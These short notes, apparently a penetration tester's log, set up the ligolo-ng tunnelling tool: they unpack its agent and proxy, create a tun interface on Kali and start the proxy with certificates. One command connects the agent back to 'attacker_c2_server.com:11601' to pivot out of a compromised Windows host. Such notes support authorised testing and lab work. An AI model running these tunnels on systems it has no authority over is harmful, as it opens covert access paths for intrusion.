### 24-Oct-23 Tue

https://github.com/nicocha30/ligolo-ng

```
unzip ligolo-ng_agent_0.4.4_windows_amd64.zip
```

```
tar -zxvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
```

![](Pasted%20image%2020231024110520.png)

```
sudo ip tuntap add user kali mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
./proxy -h
```

```
./proxy -autocert
```

```
./proxy -selfcert
```

```
./agent -connect attacker_c2_server.com:11601
```

```
./agent -connect kali'tunIP:11601 -retry -ignore-cert
```


